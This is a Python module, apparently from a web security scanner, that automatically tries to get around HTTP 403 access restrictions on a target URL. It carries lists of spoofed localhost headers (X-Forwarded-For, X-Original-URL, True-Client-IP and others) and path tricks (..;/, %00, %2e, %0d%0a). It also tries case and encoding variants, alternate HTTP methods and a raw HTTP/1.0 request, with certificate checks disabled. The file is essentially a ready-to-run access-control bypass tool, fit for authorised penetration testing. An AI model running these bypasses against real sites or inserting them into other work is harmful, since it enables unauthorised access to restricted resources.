"""Deep 403 bypass detection — headers, path, method, encoding, case variation, protocol tricks."""

import httpx
import urllib.parse
from urllib.parse import urlparse


# --- Header Bypass Techniques ---
HEADER_BYPASSES = [
    ({"X-Forwarded-For": "127.0.0.1"}, "X-Forwarded-For localhost"),
    ({"X-Forwarded-For": "1"}, "X-Forwarded-For 1"),
    ({"X-Forwarded-Host": "localhost"}, "X-Forwarded-Host localhost"),
    ({"X-Forwarded-Server": "localhost"}, "X-Forwarded-Server localhost"),
    ({"X-Original-URL": "", "X-Rewrite-URL": ""}, "X-Original-URL / X-Rewrite-URL"),
    ({"X-Custom-IP-Authorization": "127.0.0.1"}, "X-Custom-IP-Authorization"),
    ({"X-Real-IP": "127.0.0.1"}, "X-Real-IP"),
    ({"Client-IP": "127.0.0.1"}, "Client-IP"),
    ({"X-Client-IP": "127.0.0.1"}, "X-Client-IP"),
    ({"X-Remote-Addr": "127.0.0.1"}, "X-Remote-Addr"),
    ({"X-Remote-IP": "127.0.0.1"}, "X-Remote-IP"),
    ({"X-ProxyUser-IP": "127.0.0.1"}, "X-ProxyUser-IP"),
    ({"X-Real-User-IP": "127.0.0.1"}, "X-Real-User-IP"),
    ({"X-Host": "localhost"}, "X-Host"),
    ({"X-Forwarded-Proto": "https"}, "X-Forwarded-Proto"),
    ({"X-Forwarded-Port": "443"}, "X-Forwarded-Port"),
    ({"X-HTTP-Host-Override": "localhost"}, "X-HTTP-Host-Override"),
    ({"Forwarded": "for=127.0.0.1;by=127.0.0.1;host=localhost"}, "Forwarded header"),
    ({"True-Client-IP": "127.0.0.1"}, "True-Client-IP"),
    ({"CF-Connecting-IP": "127.0.0.1"}, "CF-Connecting-IP"),
    ({"X-Cluster-Client-IP": "127.0.0.1"}, "X-Cluster-Client-IP"),
]

# --- Path Bypass Techniques ---
PATH_BYPASSES = [
    "/{path}/",
    "/{path}/.",
    "/./{path}",
    "/{path}/..;/",
    "/;/{path}",
    "/..;/{path}",
    "/{path}%",
    "/{path}..;/",
    "/{path}%20",
    "/{path}%09",
    "/{path}%00",
    "/{path}~",
    "/{path}.json",
    "/{path}.html",
    "/{path}.txt",
    "/{path}%",
    "/{path}..",
    "/{path}...",
    "/{path}/..",
    "/{path}/../",
    "/%2e{path}",
    "/{path}%2f",
    "/{path}#",
    "/{path}?",
    "/{path};",
    "/{path}%0a",
    "/{path}%0d%0a",
    "/{path}\\",
    "/{path}/%20",
    "/{path}/",
    "/%2f{path}",
    "/{path}/*/",
    "/{path}/./",
]

# --- Case Variation ---
def _case_variants(path: str) -> list[str]:
    """Generate case variations of the path."""
    variants = [path]
    if path:
        variants.append(path.upper())
        variants.append(path.lower())
        variants.append(path.capitalize())
        # First letter upper, rest lower
        if len(path) > 1:
            variants.append(path[0].upper() + path[1:])
            variants.append(path[0].lower() + path[1:])
    return list(set(variants))


# --- URL Encoding Variants ---
def _encoding_variants(path: str) -> list[str]:
    """Generate URL encoding variants."""
    variants = []
    # Single encoding
    variants.append(urllib.parse.quote(path, safe="/"))
    # Double encoding
    variants.append(urllib.parse.quote(urllib.parse.quote(path, safe="/"), safe="/"))
    # ASCII hex encoding for each character
    hex_encoded = "".join(f"%{ord(c):02x}" for c in path)
    variants.append(hex_encoded)
    # Unicode encoding
    unicode_encoded = "".join(f"%u{ord(c):04x}" for c in path)
    variants.append(unicode_encoded)
    # Mixed encoding
    mixed = "".join(f"%{ord(c):02x}" if c.isalpha() else c for c in path)
    variants.append(mixed)
    return list(set(variants))


# --- HTTP Method Variations ---
METHOD_BYPASSES = [
    "GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS",
    "HEAD", "TRACE", "CONNECT", "PROPFIND", "PROPPATCH",
    "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
]


# --- Protocol-Level Bypass ---
PROTOCOL_BYPASSES = [
    ("HTTP/1.0", "HTTP/1.0 request without Host header"),
    ("HTTP/2", "HTTP/2 may bypass WAF rules"),
]


async def bypass_403(target: str) -> dict:
    """Deep 403 bypass detection with headers, path tricks, encoding, case variation, protocol tricks."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urlparse(target)
    path = parsed.path or "/"
    base = f"{parsed.scheme}://{parsed.netloc}"
    results = []
    bypass_found = False

    async with httpx.AsyncClient(timeout=15.0, follow_redirects=False, verify=False) as client:
        # --- Baseline ---
        try:
            resp = await client.get(target)
            baseline_status = resp.status_code
        except httpx.HTTPError:
            baseline_status = 403

        if baseline_status != 403:
            return {
                "target": target,
                "baseline_status": baseline_status,
                "bypasses": [],
                "bypass_found": False,
                "note": "Target returned non-403 status",
            }

        # --- Header Bypass ---
        for headers, desc in HEADER_BYPASSES:
            if bypass_found:
                break
            try:
                resp = await client.get(target, headers=headers)
                if resp.status_code != 403 and resp.status_code < 400:
                    results.append({
                        "technique": "header_bypass",
                        "description": desc,
                        "headers": headers,
                        "status": resp.status_code,
                        "success": True,
                    })
                    bypass_found = True
                    break
            except httpx.HTTPError:
                continue

        # --- Path Bypass ---
        if not bypass_found:
            for trick_template in PATH_BYPASSES:
                if bypass_found:
                    break
                trick = trick_template.replace("{path}", path.rstrip("/"))
                try:
                    url = f"{base}{trick}"
                    resp = await client.get(url)
                    if resp.status_code != 403 and resp.status_code < 400:
                        results.append({
                            "technique": "path_bypass",
                            "description": f"Path trick: {trick}",
                            "url": url,
                            "status": resp.status_code,
                            "success": True,
                        })
                        bypass_found = True
                        break
                except httpx.HTTPError:
                    continue

        # --- Case Variation ---
        if not bypass_found:
            for variant in _case_variants(path)[:5]:
                if bypass_found:
                    break
                try:
                    url = f"{base}{variant}"
                    resp = await client.get(url)
                    if resp.status_code != 403 and resp.status_code < 400:
                        results.append({
                            "technique": "case_bypass",
                            "description": f"Case variation: {variant}",
                            "url": url,
                            "status": resp.status_code,
                            "success": True,
                        })
                        bypass_found = True
                        break
                except httpx.HTTPError:
                    continue

        # --- URL Encoding ---
        if not bypass_found:
            for variant in _encoding_variants(path)[:5]:
                if bypass_found:
                    break
                try:
                    url = f"{base}{variant}"
                    resp = await client.get(url)
                    if resp.status_code != 403 and resp.status_code < 400:
                        results.append({
                            "technique": "encoding_bypass",
                            "description": f"URL encoding: {variant}",
                            "url": url,
                            "status": resp.status_code,
                            "success": True,
                        })
                        bypass_found = True
                        break
                except httpx.HTTPError:
                    continue

        # --- HTTP Method Variation ---
        if not bypass_found:
            for method in METHOD_BYPASSES:
                if bypass_found:
                    break
                try:
                    resp = await client.request(method, target)
                    if resp.status_code != 403 and resp.status_code < 400:
                        results.append({
                            "technique": "method_bypass",
                            "description": f"HTTP method: {method}",
                            "method": method,
                            "status": resp.status_code,
                            "success": True,
                        })
                        bypass_found = True
                        break
                except httpx.HTTPError:
                    continue

        # --- Protocol-Level Bypass ---
        if not bypass_found:
            # HTTP/1.0 without Host
            try:
                import asyncio
                import ssl
                host = parsed.hostname
                port = 443 if parsed.scheme == "https" else 80

                ctx = ssl.create_default_context() if parsed.scheme == "https" else None
                if ctx:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                r, w = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ctx),
                    timeout=10,
                )
                request = f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n"
                w.write(request.encode())
                await w.drain()

                resp_data = b""
                try:
                    while True:
                        chunk = await asyncio.wait_for(r.read(4096), timeout=5)
                        if not chunk:
                            break
                        resp_data += chunk
                except asyncio.TimeoutError:
                    pass
                w.close()

                resp_text = resp_data.decode(errors="replace")
                if "HTTP/1.0 200" in resp_text or "200 OK" in resp_text:
                    results.append({
                        "technique": "protocol_bypass",
                        "description": "HTTP/1.0 bypass",
                        "status": 200,
                        "success": True,
                    })
                    bypass_found = True
            except Exception:
                pass

    return {
        "target": target,
        "baseline_status": baseline_status,
        "bypasses": results,
        "bypass_found": bypass_found,
        "total_techniques_tried": len(HEADER_BYPASSES) + len(PATH_BYPASSES) + len(_case_variants(path)) + len(METHOD_BYPASSES),
        "techniques_found": list(set(r["technique"] for r in results)),
    }
